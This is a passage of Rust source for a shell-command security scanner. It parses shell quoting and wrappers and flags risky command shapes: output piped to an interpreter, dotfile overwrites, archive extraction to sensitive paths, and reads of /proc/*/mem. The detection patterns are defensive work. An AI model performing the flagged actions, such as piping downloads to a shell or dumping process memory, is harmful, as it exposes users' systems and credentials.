use once_cell::sync::Lazy;
use regex::Regex;

use crate::extract::ScanContext;
use crate::redact;
use crate::tokenize::{self, ShellType};
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Canonical list of known interpreters (lowercase).
/// Used by `is_interpreter()` and validated against tier-1 regex by drift test.
pub const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "csh",
    "tcsh",
    "ash",
    "mksh",
    "python",
    "python2",
    "python3",
    "node",
    "deno",
    "bun",
    "perl",
    "ruby",
    "php",
    "lua",
    "tclsh",
    "elixir",
    "rscript",
    "pwsh",
    "iex",
    "invoke-expression",
    "cmd",
];

/// Parse up to `max_digits` from `chars[*i..]` matching `predicate`, interpret as
/// base-`radix`, and return the corresponding char. Advances `*i` past consumed digits.
/// Zero heap allocations — uses a fixed stack buffer.
fn parse_numeric_escape(
    chars: &[char],
    i: &mut usize,
    max_digits: usize,
    radix: u32,
    predicate: fn(&char) -> bool,
) -> Option<char> {
    let mut buf = [0u8; 8];
    let mut n = 0;
    for _ in 0..max_digits {
        if *i < chars.len() && predicate(&chars[*i]) {
            buf[n] = chars[*i] as u8;
            n += 1;
            *i += 1;
        } else {
            break;
        }
    }
    if n == 0 {
        return None;
    }
    let s = std::str::from_utf8(&buf[..n]).ok()?;
    let val = u32::from_str_radix(s, radix).ok()?;
    char::from_u32(val)
}

/// Strip all shell quoting/escaping from a token, producing the effective string
/// the shell would see after expansion.
///
/// Handles: single quotes, double quotes, ANSI-C quoting (`$'...'`), backslash
/// escaping (POSIX) and backtick escaping (PowerShell).
fn normalize_shell_token(input: &str, shell: ShellType) -> String {
    #[derive(PartialEq)]
    enum QState {
        Normal,
        Single,
        Double,
        AnsiC,
    }

    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut out = String::with_capacity(len);
    let mut i = 0;
    let is_ps = matches!(shell, ShellType::PowerShell);
    let is_cmd = matches!(shell, ShellType::Cmd);
    let mut state = QState::Normal;

    while i < len {
        match state {
            QState::Normal => {
                let ch = chars[i];
                if is_cmd && ch == '^' && i + 1 < len {
                    // Cmd caret escape: skip caret, take next char literal
                    out.push(chars[i + 1]);
                    i += 2;
                } else if !is_ps && !is_cmd && ch == '\\' && i + 1 < len {
                    // POSIX backslash escape: skip backslash, take next char literal
                    out.push(chars[i + 1]);
                    i += 2;
                } else if is_ps && ch == '`' && i + 1 < len {
                    // PowerShell backtick escape
                    out.push(chars[i + 1]);
                    i += 2;
                } else if ch == '\'' && !is_cmd {
                    state = QState::Single;
                    i += 1;
                } else if ch == '"' {
                    state = QState::Double;
                    i += 1;
                } else if shell == ShellType::Posix
                    && ch == '$'
                    && i + 1 < len
                    && chars[i + 1] == '\''
                {
                    state = QState::AnsiC;
                    i += 2;
                } else {
                    out.push(ch);
                    i += 1;
                }
            }
            // SINGLE_QUOTE: everything literal until closing '
            QState::Single => {
                if chars[i] == '\'' {
                    // PowerShell: '' inside single quotes is an escaped literal '
                    if is_ps && i + 1 < len && chars[i + 1] == '\'' {
                        out.push('\'');
                        i += 2;
                    } else {
                        state = QState::Normal;
                        i += 1;
                    }
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            // DOUBLE_QUOTE
            QState::Double => {
                if chars[i] == '"' {
                    state = QState::Normal;
                    i += 1;
                } else if is_cmd && chars[i] == '^' && i + 1 < len {
                    // Cmd caret escaping is still active inside double quotes.
                    out.push(chars[i + 1]);
                    i += 2;
                } else if !is_ps && chars[i] == '\\' && i + 1 < len {
                    // POSIX: only \", \\, \$, \` are special inside double quotes
                    let next = chars[i + 1];
                    if next == '"' || next == '\\' || next == '$' || next == '`' {
                        out.push(next);
                        i += 2;
                    } else {
                        // literal backslash
                        out.push('\\');
                        out.push(next);
                        i += 2;
                    }
                } else if is_ps && chars[i] == '`' && i + 1 < len {
                    // PowerShell backtick escape inside double quotes
                    out.push(chars[i + 1]);
                    i += 2;
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            // ANSIC_QUOTE (POSIX only): decode escape sequences
            QState::AnsiC => {
                if chars[i] == '\'' {
                    state = QState::Normal;
                    i += 1;
                } else if chars[i] == '\\' && i + 1 < len {
                    let esc = chars[i + 1];
                    match esc {
                        'n' => {
                            out.push('\n');
                            i += 2;
                        }
                        't' => {
                            out.push('\t');
                            i += 2;
                        }
                        'r' => {
                            out.push('\r');
                            i += 2;
                        }
                        '\\' => {
                            out.push('\\');
                            i += 2;
                        }
                        '\'' => {
                            out.push('\'');
                            i += 2;
                        }
                        '"' => {
                            out.push('"');
                            i += 2;
                        }
                        'a' => {
                            out.push('\x07');
                            i += 2;
                        }
                        'b' => {
                            out.push('\x08');
                            i += 2;
                        }
                        'e' | 'E' => {
                            out.push('\x1b');
                            i += 2;
                        }
                        'f' => {
                            out.push('\x0c');
                            i += 2;
                        }
                        'v' => {
                            out.push('\x0b');
                            i += 2;
                        }
                        'x' => {
                            // \xHH — 1 or 2 hex digits
                            i += 2;
                            if let Some(c) =
                                parse_numeric_escape(&chars, &mut i, 2, 16, char::is_ascii_hexdigit)
                            {
                                out.push(c);
                            }
                        }
                        'u' => {
                            // \uHHHH — 1 to 4 hex digits
                            i += 2;
                            if let Some(c) =
                                parse_numeric_escape(&chars, &mut i, 4, 16, char::is_ascii_hexdigit)
                            {
                                out.push(c);
                            }
                        }
                        'U' => {
                            // \UHHHHHHHH — 1 to 8 hex digits
                            i += 2;
                            if let Some(c) =
                                parse_numeric_escape(&chars, &mut i, 8, 16, char::is_ascii_hexdigit)
                            {
                                out.push(c);
                            }
                        }
                        c if c.is_ascii_digit() && c <= '7' => {
                            // \NNN octal — 1 to 3 octal digits
                            i += 1; // skip backslash
                            if let Some(c) = parse_numeric_escape(&chars, &mut i, 3, 8, |c| {
                                c.is_ascii_digit() && *c <= '7'
                            }) {
                                out.push(c);
                            }
                        }
                        _ => {
                            // Unknown escape: emit literal
                            out.push('\\');
                            out.push(esc);
                            i += 2;
                        }
                    }
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
        }
    }
    out
}

/// Extract the effective command base name from a raw token.
///
/// Normalize → path basename → first word → lowercase → strip .exe
fn normalize_cmd_base(raw: &str, shell: ShellType) -> String {
    let normalized = normalize_shell_token(raw.trim(), shell);
    basename_from_normalized(&normalized, shell)
}

/// Extract basename from an already-normalized (unquoted) string.
/// Handles path separators, first-word extraction, lowercasing, and .exe stripping.
fn basename_from_normalized(normalized: &str, shell: ShellType) -> String {
    let has_path_sep = match shell {
        ShellType::PowerShell | ShellType::Cmd => {
            normalized.contains('/') || normalized.contains('\\')
        }
        _ => normalized.contains('/'),
    };
    let after_path = if has_path_sep {
        match shell {
            ShellType::PowerShell | ShellType::Cmd => {
                normalized.rsplit(['/', '\\']).next().unwrap_or(normalized)
            }
            _ => normalized.rsplit('/').next().unwrap_or(normalized),
        }
    } else {
        normalized
    };
    let first_word = after_path.split_whitespace().next().unwrap_or("");
    let lower = first_word.to_lowercase();
    if lower.ends_with(".exe") {
        lower[..lower.len() - 4].to_string()
    } else {
        lower
    }
}

fn is_interpreter(cmd: &str) -> bool {
    INTERPRETERS.contains(&cmd)
}

/// Run command-shape rules.
pub fn check(
    input: &str,
    shell: ShellType,
    cwd: Option<&str>,
    scan_context: ScanContext,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let segments = tokenize::tokenize(input, shell);

    // Check for pipe-to-interpreter patterns
    let has_pipe = segments.iter().any(|s| {
        s.preceding_separator.as_deref() == Some("|")
            || s.preceding_separator.as_deref() == Some("|&")
    });
    if has_pipe {
        check_pipe_to_interpreter(&segments, shell, &mut findings);
    }

    // Check for insecure TLS flags in source commands
    for segment in &segments {
        if let Some(ref cmd) = segment.command {
            let cmd_base = normalize_cmd_base(cmd, shell);
            if is_source_command(&cmd_base) {
                let tls_findings =
                    crate::rules::transport::check_insecure_flags(&segment.args, true);
                findings.extend(tls_findings);
            }
        }
    }

    // Check for dotfile overwrites
    check_dotfile_overwrite(&segments, &mut findings);

    // Check for archive extraction to sensitive paths
    check_archive_extract(&segments, &mut findings);

    // Check for process memory access
    check_proc_mem_access(&segments, shell, &mut findings);

    // Check for Docker remote privilege escalation
    check_docker_remote_privesc(&segments, shell, &mut findings);

    // Check for credential file sweep (exec-only)
    check_credential_file_sweep(&segments, shell, scan_context, &mut findings);

    // Check for cargo install/add without supply-chain audit (exec-only)
    if scan_context == ScanContext::Exec {
        check_vet_not_configured(&segments, cwd, &mut findings);
    }

    // Check for dangerous environment variable exports
    check_env_var_in_command(&segments, &mut findings);

    // Check for network destination access (metadata endpoints, private networks)
    check_network_destination(&segments, &mut findings);

    // Check for base64 decode-execute chains
    check_base64_decode_execute(&segments, shell, &mut findings);

    // Check for data exfiltration via curl/wget uploads
    check_data_exfiltration(&segments, shell, &mut findings);

    findings
}

/// Resolve the effective interpreter from a segment, handling all quoting forms,
/// wrappers (sudo, env, command, exec, nohup), subshells, and brace groups.
fn resolve_interpreter_name(seg: &tokenize::Segment, shell: ShellType) -> Option<String> {
    if let Some(ref cmd) = seg.command {
        let cmd_base = normalize_cmd_base(cmd, shell);

        // Direct interpreter
        if is_interpreter(&cmd_base) {
            return Some(cmd_base);
        }

        // Subshell: (bash) → strip parens, check
        let stripped = cmd_base.trim_start_matches('(').trim_end_matches(')');
        if stripped != cmd_base && is_interpreter(stripped) {
            return Some(stripped.to_string());
        }

        // Brace group: { → first arg is command
        if cmd_base == "{" {
            return resolve_from_args(&seg.args, shell);
        }

        // Known wrappers
        match cmd_base.as_str() {
            "sudo" => return resolve_sudo_args(&seg.args, shell),
            "env" => return resolve_env_args(&seg.args, shell),
            "command" | "exec" | "nohup" => {
                return resolve_wrapper_args(&seg.args, &cmd_base, shell);
            }
            _ => {}
        }
    }
    None
}

/// Resolve the base command from a segment, stripping sudo/env/command/nohup/exec wrappers.
/// Returns the normalized base command name (lowercase, .exe stripped).
/// Unlike `resolve_interpreter_name`, this returns ANY command — not just interpreters.
fn resolve_base_through_wrappers(seg: &tokenize::Segment, shell: ShellType) -> String {
    let Some(ref cmd) = seg.command else {
        return String::new();
    };
    let cmd_base = normalize_cmd_base(cmd, shell);

    match cmd_base.as_str() {
        "sudo" => resolve_base_sudo(&seg.args, shell).unwrap_or(cmd_base),
        "env" => resolve_base_env(&seg.args, shell).unwrap_or(cmd_base),
        "command" | "exec" | "nohup" => {
            resolve_base_wrapper(&seg.args, &cmd_base, shell).unwrap_or(cmd_base)
        }
        _ => cmd_base,
    }
}

/// Resolve base command through sudo wrapper.
fn resolve_base_sudo(args: &[String], shell: ShellType) -> Option<String> {
    let value_short_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
    let value_long_flags = [
        "--user",
        "--group",
        "--close-from",
        "--chdir",
        "--role",
        "--type",
        "--other-user",
        "--host",
        "--timeout",
    ];
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            // Next positional after -- is the command
            if idx + 1 < args.len() {
                return Some(normalize_cmd_base(&args[idx + 1], shell));
            }
            return None;
        }
        if normalized.starts_with("--") {
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f)
                || (normalized.len() > 2
                    && value_short_flags
                        .iter()
                        .any(|f| normalized.ends_with(&f[1..])))
            {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        // First positional is the command — recurse for nested wrappers
        let base = normalize_cmd_base(&args[idx], shell);
        return match base.as_str() {
            "sudo" => resolve_base_sudo(&args[idx + 1..], shell),
            "env" => resolve_base_env(&args[idx + 1..], shell),
            "command" | "exec" | "nohup" => resolve_base_wrapper(&args[idx + 1..], &base, shell),
            _ => Some(base),
        };
    }
    None
}

/// Resolve base command through env wrapper.
fn resolve_base_env(args: &[String], shell: ShellType) -> Option<String> {
    let value_short_flags = ["-u", "-C"];
    let value_long_flags = [
        "--unset",
        "--chdir",
        "--split-string",
        "--block-signal",
        "--default-signal",
        "--ignore-signal",
    ];
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            if idx + 1 < args.len() {
                return Some(normalize_cmd_base(&args[idx + 1], shell));
            }
            return None;
        }
        if normalized.starts_with("--") {
            if normalized == "--split-string" {
                if idx + 1 < args.len() {
                    return resolve_base_from_command_string(&args[idx + 1], shell);
                }
                return None;
            }
            if let Some(val) = normalized.strip_prefix("--split-string=") {
                return resolve_base_from_command_string(val, shell);
            }
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized == "-S" {
            if idx + 1 < args.len() {
                return resolve_base_from_command_string(&args[idx + 1], shell);
            }
            return None;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        // VAR=VALUE assignments
        if normalized.contains('=') {
            idx += 1;
            continue;
        }
        // First positional is the command
        let base = normalize_cmd_base(&args[idx], shell);
        return match base.as_str() {
            "sudo" => resolve_base_sudo(&args[idx + 1..], shell),
            "env" => resolve_base_env(&args[idx + 1..], shell),
            "command" | "exec" | "nohup" => resolve_base_wrapper(&args[idx + 1..], &base, shell),
            _ => Some(base),
        };
    }
    None
}

fn resolve_base_from_command_string(command: &str, shell: ShellType) -> Option<String> {
    let normalized = normalize_shell_token(command.trim(), shell);
    if normalized.is_empty() {
        return None;
    }

    let segments = tokenize::tokenize(&normalized, shell);
    let first = segments.first()?;
    let base = resolve_base_through_wrappers(first, shell);
    if base.is_empty() {
        None
    } else {
        Some(base)
    }
}

fn unwrap_env_split_string_segment(
    seg: &tokenize::Segment,
    shell: ShellType,
) -> Option<tokenize::Segment> {
    let command = seg.command.as_ref()?;
    if normalize_cmd_base(command, shell) != "env" {
        return None;
    }

    let value_short_flags = ["-u", "-C"];
    let value_long_flags = [
        "--unset",
        "--chdir",
        "--block-signal",
        "--default-signal",
        "--ignore-signal",
    ];

    let args = &seg.args;
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--split-string" || normalized == "-S" {
            let command = args.get(idx + 1)?;
            let normalized_command = normalize_shell_token(command.trim(), shell);
            return tokenize::tokenize(&normalized_command, shell)
                .into_iter()
                .next();
        }
        if let Some(val) = normalized.strip_prefix("--split-string=") {
            let normalized_command = normalize_shell_token(val.trim(), shell);
            return tokenize::tokenize(&normalized_command, shell)
                .into_iter()
                .next();
        }
        if normalized == "--" {
            return None;
        }
        if normalized.starts_with("--") {
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.contains('=') {
            idx += 1;
            continue;
        }
        return None;
    }
    None
}

/// Resolve base command through command/exec/nohup wrappers.
fn resolve_base_wrapper(args: &[String], wrapper: &str, shell: ShellType) -> Option<String> {
    let value_flags: &[&str] = match wrapper {
        "exec" => &["-a"],
        _ => &[],
    };
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            if idx + 1 < args.len() {
                return Some(normalize_cmd_base(&args[idx + 1], shell));
            }
            return None;
        }
        if normalized.starts_with("--") || normalized.starts_with('-') {
            if value_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        let base = normalize_cmd_base(&args[idx], shell);
        return match base.as_str() {
            "sudo" => resolve_base_sudo(&args[idx + 1..], shell),
            "env" => resolve_base_env(&args[idx + 1..], shell),
            "command" | "exec" | "nohup" => resolve_base_wrapper(&args[idx + 1..], &base, shell),
            _ => Some(base),
        };
    }
    None
}

#[derive(Clone, Copy)]
enum ResolverParser {
    Generic,
    Sudo,
    Env,
    Command,
    Exec,
    Nohup,
}

enum ResolveStep<'a> {
    Found(String),
    Next {
        parser: ResolverParser,
        args: &'a [String],
        inspected: usize,
    },
    Stop,
}

/// Resolve interpreter from a generic arg list. Uses an iterative parser with a
/// token-inspection budget so deeply nested wrappers cannot bypass detection.
fn resolve_from_args(args: &[String], shell: ShellType) -> Option<String> {
    resolve_with_parser(args, shell, ResolverParser::Generic)
}

fn resolve_sudo_args(args: &[String], shell: ShellType) -> Option<String> {
    resolve_with_parser(args, shell, ResolverParser::Sudo)
}

fn resolve_env_args(args: &[String], shell: ShellType) -> Option<String> {
    resolve_with_parser(args, shell, ResolverParser::Env)
}

fn resolve_wrapper_args(args: &[String], wrapper: &str, shell: ShellType) -> Option<String> {
    let parser = match wrapper {
        "command" => ResolverParser::Command,
        "exec" => ResolverParser::Exec,
        "nohup" => ResolverParser::Nohup,
        _ => ResolverParser::Command,
    };
    resolve_with_parser(args, shell, parser)
}

fn resolve_with_parser(
    args: &[String],
    shell: ShellType,
    start_parser: ResolverParser,
) -> Option<String> {
    if args.is_empty() {
        return None;
    }

    let mut parser = start_parser;
    let mut current = args;
    // Budget scales with input size and keeps resolution bounded even on adversarial inputs.
    let mut budget = args.len().saturating_mul(4).saturating_add(8);

    while budget > 0 && !current.is_empty() {
        let step = match parser {
            ResolverParser::Generic => resolve_step_generic(current, shell),
            ResolverParser::Sudo => resolve_step_sudo(current, shell),
            ResolverParser::Env => resolve_step_env(current, shell),
            ResolverParser::Command => resolve_step_wrapper(current, shell, "command"),
            ResolverParser::Exec => resolve_step_wrapper(current, shell, "exec"),
            ResolverParser::Nohup => resolve_step_wrapper(current, shell, "nohup"),
        };

        match step {
            ResolveStep::Found(interpreter) => return Some(interpreter),
            ResolveStep::Stop => return None,
            ResolveStep::Next {
                parser: next_parser,
                args: next_args,
                inspected,
            } => {
                parser = next_parser;
                current = next_args;
                budget = budget.saturating_sub(inspected.max(1));
            }
        }
    }
    None
}

fn resolve_step_generic<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
    let mut idx = 0;
    let mut seen_dashdash = false;
    while idx < args.len() {
        let raw = args[idx].trim();
        let normalized = normalize_shell_token(raw, shell);

        // Track end-of-options marker
        if normalized == "--" {
            seen_dashdash = true;
            idx += 1;
            continue;
        }

        // Skip flags and assignments (only before --)
        if !seen_dashdash
            && (normalized.starts_with("--")
                || normalized.starts_with('-')
                || normalized.contains('='))
        {
            idx += 1;
            continue;
        }

        let base = basename_from_normalized(&normalized, shell);
        return match base.as_str() {
            "sudo" => ResolveStep::Next {
                parser: ResolverParser::Sudo,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            "env" => ResolveStep::Next {
                parser: ResolverParser::Env,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            "command" => ResolveStep::Next {
                parser: ResolverParser::Command,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            "exec" => ResolveStep::Next {
                parser: ResolverParser::Exec,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            "nohup" => ResolveStep::Next {
                parser: ResolverParser::Nohup,
                args: &args[idx + 1..],
                inspected: idx + 1,
            },
            _ if is_interpreter(&base) => ResolveStep::Found(base),
            _ => ResolveStep::Stop,
        };
    }
    ResolveStep::Stop
}

fn resolve_step_sudo<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
    let value_short_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
    let value_long_flags = [
        "--user",
        "--group",
        "--close-from",
        "--chdir",
        "--role",
        "--type",
        "--other-user",
        "--host",
        "--timeout",
    ];

    let mut idx = 0;
    while idx < args.len() {
        let raw = args[idx].trim();
        let normalized = normalize_shell_token(raw, shell);
        // -- ends option parsing; remaining args are the command
        if normalized == "--" {
            return ResolveStep::Next {
                parser: ResolverParser::Generic,
                args: &args[(idx + 1).min(args.len())..],
                inspected: idx + 1,
            };
        }
        if normalized.starts_with("--") {
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
                continue;
            }
            if let Some((key, _)) = normalized.split_once('=') {
                if value_long_flags.contains(&key) {
                    idx += 1;
                    continue;
                }
            }
            // Unknown long flag: treat as boolean.
            idx += 1;
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                // Exact match: e.g. -u → next arg is the value
                idx += 2;
            } else if normalized.len() > 2
                && value_short_flags.iter().any(|f| {
                    normalized.ends_with(&f[1..]) // last char matches value-flag letter
                })
            {
                // Combined short flags: e.g. -iu → -i + -u, last flag takes a value
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        return ResolveStep::Next {
            parser: ResolverParser::Generic,
            args: &args[idx..],
            inspected: idx + 1,
        };
    }
    ResolveStep::Stop
}

fn resolve_step_env<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
    let value_short_flags = ["-u", "-C"];
    let value_long_flags = [
        "--unset",
        "--chdir",
        "--split-string",
        "--block-signal",
        "--default-signal",
        "--ignore-signal",
    ];

    let mut idx = 0;
    while idx < args.len() {
        let raw = args[idx].trim();
        let normalized = normalize_shell_token(raw, shell);
        // -- ends option parsing; remaining args are the command
        if normalized == "--" {
            return ResolveStep::Next {
                parser: ResolverParser::Generic,
                args: &args[(idx + 1).min(args.len())..],
                inspected: idx + 1,
            };
        }
        if normalized.starts_with("--") {
            // --split-string: value is a command string.
            if normalized == "--split-string" {
                if idx + 1 < args.len() {
                    let base = normalize_cmd_base(&args[idx + 1], shell);
                    if is_interpreter(&base) {
                        return ResolveStep::Found(base);
                    }
                }
                idx += 2;
                continue;
            }
            if let Some(val) = normalized.strip_prefix("--split-string=") {
                let base = normalize_cmd_base(val, shell);
                if is_interpreter(&base) {
                    return ResolveStep::Found(base);
                }
                idx += 1;
                continue;
            }
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
                continue;
            }
            if let Some((key, _)) = normalized.split_once('=') {
                if value_long_flags.contains(&key) {
                    idx += 1;
                    continue;
                }
            }
            // Unknown long flag: treat as boolean.
            idx += 1;
            continue;
        }
        if normalized == "-S" {
            // -S: value is a command string.
            if idx + 1 < args.len() {
                let base = normalize_cmd_base(&args[idx + 1], shell);
                if is_interpreter(&base) {
                    return ResolveStep::Found(base);
                }
            }
            idx += 2;
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.contains('=') {
            idx += 1;
            continue;
        }
        return ResolveStep::Next {
            parser: ResolverParser::Generic,
            args: &args[idx..],
            inspected: idx + 1,
        };
    }
    ResolveStep::Stop
}

fn resolve_step_wrapper<'a>(
    args: &'a [String],
    shell: ShellType,
    wrapper: &str,
) -> ResolveStep<'a> {
    let value_flags: &[&str] = match wrapper {
        "exec" => &["-a"],
        _ => &[],
    };

    let mut idx = 0;
    while idx < args.len() {
        let raw = args[idx].trim();
        let normalized = normalize_shell_token(raw, shell);
        // -- ends option parsing; remaining args are the command
        if normalized == "--" {
            return ResolveStep::Next {
                parser: ResolverParser::Generic,
                args: &args[(idx + 1).min(args.len())..],
                inspected: idx + 1,
            };
        }
        if normalized.starts_with("--") || normalized.starts_with('-') {
            if value_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        return ResolveStep::Next {
            parser: ResolverParser::Generic,
            args: &args[idx..],
            inspected: idx + 1,
        };
    }
    ResolveStep::Stop
}

fn check_pipe_to_interpreter(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for (i, seg) in segments.iter().enumerate() {
        if i == 0 {
            continue;
        }
        if let Some(sep) = &seg.preceding_separator {
            if sep == "|" || sep == "|&" {
                if let Some(interpreter) = resolve_interpreter_name(seg, shell) {
                    // i > 0 is guaranteed — the loop skips i == 0 above.
                    let source = &segments[i - 1];
                    let source_cmd_ref = source.command.as_deref().unwrap_or("unknown");
                    let source_base = normalize_cmd_base(source_cmd_ref, shell);
                    let source_is_tirith_run = source_base == "tirith"
                        && source
                            .args
                            .first()
                            .map(|arg| normalize_cmd_base(arg, shell) == "run")
                            .unwrap_or(false);
                    let source_label = if source_is_tirith_run {
                        "tirith run".to_string()
                    } else {
                        source_base.clone()
                    };

                    // Skip if the source is tirith itself — its output is trusted.
                    if source_base == "tirith" && !source_is_tirith_run {
                        continue;
                    }

                    let rule_id = match source_base.as_str() {
                        "curl" => RuleId::CurlPipeShell,
                        "wget" => RuleId::WgetPipeShell,
                        "http" | "https" => RuleId::HttpiePipeShell,
                        "xh" => RuleId::XhPipeShell,
                        _ => RuleId::PipeToInterpreter,
                    };

                    let display_cmd = seg.command.as_deref().unwrap_or(&interpreter);

                    let base_desc = format!(
                        "Command pipes output from '{source_label}' directly to \
                         interpreter '{interpreter}'. Downloaded content will be \
                         executed without inspection."
                    );

                    let description = if is_url_fetch_command(&source_base) {
                        let show_tirith_run = cfg!(unix)
                            && supports_tirith_run_hint(&source_base)
                            && shell != ShellType::PowerShell;
                        if let Some(url) = extract_urls_from_args(&source.args, shell)
                            .into_iter()
                            .next()
                            .map(|u| sanitize_url_for_display(&u))
                        {
                            if show_tirith_run {
                                format!(
                                    "{base_desc}\n  Safer: tirith run {url}  \
                                     \u{2014} or: vet {url}  (https://getvet.sh)"
                                )
                            } else {
                                format!(
                                    "{base_desc}\n  Safer: vet {url}  \
                                     (https://getvet.sh)"
                                )
                            }
                        } else if show_tirith_run {
                            format!(
                                "{base_desc}\n  Safer: use 'tirith run <url>' \
                                 or 'vet <url>' (https://getvet.sh) to inspect \
                                 before executing."
                            )
                        } else {
                            format!(
                                "{base_desc}\n  Safer: use 'vet <url>' \
                                 (https://getvet.sh) to inspect before executing."
                            )
                        }
                    } else {
                        base_desc
                    };

                    let mut evidence = vec![Evidence::CommandPattern {
                        pattern: "pipe to interpreter".to_string(),
                        matched: redact::redact_shell_assignments(&format!(
                            "{} | {}",
                            source.raw, seg.raw
                        )),
                    }];
                    for url in extract_urls_from_args(&source.args, shell) {
                        evidence.push(Evidence::Url { raw: url });
                    }

                    findings.push(Finding {
                        rule_id,
                        severity: Severity::High,
                        title: format!("Pipe to interpreter: {source_cmd_ref} | {display_cmd}"),
                        description,
                        evidence,
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }
        }
    }
}

fn check_dotfile_overwrite(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        // Check for redirects to dotfiles
        let raw = &segment.raw;
        if (raw.contains("> ~/.")
            || raw.contains("> $HOME/.")
            || raw.contains(">> ~/.")
            || raw.contains(">> $HOME/."))
            && !raw.contains("> /dev/null")
        {
            findings.push(Finding {
                rule_id: RuleId::DotfileOverwrite,
                severity: Severity::High,
                title: "Dotfile overwrite detected".to_string(),
                description: "Command redirects output to a dotfile in the home directory, which could overwrite shell configuration".to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "redirect to dotfile".to_string(),
                    matched: redact::redact_shell_assignments(raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }
}

fn check_archive_extract(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
    for segment in segments {
        if let Some(ref cmd) = segment.command {
            let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
            if cmd_base == "tar" || cmd_base == "unzip" || cmd_base == "7z" {
                // Check if extracting to a sensitive directory
                let raw = &segment.raw;
                let sensitive_targets = [
                    "-C /",
                    "-C ~/",
                    "-C $HOME/",
                    "-d /",
                    "-d ~/",
                    "-d $HOME/",
                    "> ~/.",
                    ">> ~/.",
                ];
                for target in &sensitive_targets {
                    if raw.contains(target) {
                        findings.push(Finding {
                            rule_id: RuleId::ArchiveExtract,
                            severity: Severity::Medium,
                            title: "Archive extraction to sensitive path".to_string(),
                            description: format!(
                                "Archive command '{cmd_base}' extracts to a potentially sensitive location"
                            ),
                            evidence: vec![Evidence::CommandPattern {
                                pattern: "archive extract".to_string(),
                                matched: redact::redact_shell_assignments(raw),
                            }],
                            human_view: None,
                            agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
                        });
                        return;
                    }
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Process memory access detection
// ---------------------------------------------------------------------------

/// Commands that read file contents — scoped to utilities commonly used
/// for proc memory dumping. Excludes echo/printf (not file readers).
const PROC_MEM_READER_CMDS: &[&str] = &[
    "cat", "dd", "strings", "head", "tail", "xxd", "od", "base64", "hexdump", "less", "more", "cp",
    "grep",
];

static PROC_MEM_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"/proc/(?:self|\d+)/mem\b").expect("PROC_MEM_RE"));

fn check_proc_mem_access(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let effective_seg =
            unwrap_env_split_string_segment(seg, shell).unwrap_or_else(|| seg.clone());
        let resolved_cmd = resolve_base_through_wrappers(&effective_seg, shell);
        if !PROC_MEM_READER_CMDS.contains(&resolved_cmd.as_str()) {
            continue;
        }

        for arg in &effective_seg.args {
            let normalized = normalize_shell_token(arg, shell);
            if PROC_MEM_RE.is_match(&normalized) {
                findings.push(Finding {
                    rule_id: RuleId::ProcMemAccess,
                    severity: Severity::High,
                    title: "Process memory access detected".to_string(),
                    description: "Command reads from /proc/*/mem, which can dump process memory \
                                  contents including secrets and credentials"
                        .to_string(),
                    evidence: vec![Evidence::CommandPattern {
                        pattern: "proc memory read".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
